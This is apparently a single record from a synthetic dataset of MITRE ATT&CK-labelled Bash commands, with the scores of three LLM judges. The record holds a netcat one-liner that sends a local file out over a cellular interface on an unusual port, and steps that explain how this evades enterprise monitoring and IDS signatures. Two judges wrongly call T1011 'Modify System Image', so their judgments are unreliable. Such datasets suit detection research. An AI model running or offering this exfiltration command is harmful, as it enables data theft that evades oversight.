@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc",
+  "explanation": "Uses a cellular data interface (wwan0) to send data over an uncommon TCP port with minimal monitoring via tcpdump. This shifts exfiltration to a cellular medium, consistent with T1011.",
+  "rationale_steps": [
+    "Choose the cellular interface to avoid enterprise wired/wireless paths.",
+    "Use rare TCP port 55941 to avoid default IDS signatures.",
+    "Limit tcpdump to the exact interface/port and drop captured bytes.",
+    "Bind nc to the wwan0 source IP to force the cellular route."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-0a44b145",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt exfiltration over a cellular interface which aligns with the general concept of data exfiltration, it doesn't actually modify system images or firmware as described in T1011 (Modify System Image), making it misaligned with the claimed technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:06:35.315757Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, arguments, redirects, and backgrounding syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration using `nc` and attempts to monitor it with `tcpdump`, which is an entirely different action than 'Modify System Image' (T1011), making the claim of consistency with T1011 incorrect.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:06:49.848317Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash pipeline with valid flags, proper backgrounding via '&', and correct redirections with no quoting issues.",
+        "semantic_score": 4,
+        "semantic_justification": "nc exfiltrates the file bound to the cellular interface IP (wwan0) on a nonstandard port consistent with T1011, though the tcpdump 'monitoring' likely fails without elevated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-02T19:07:06.648419Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
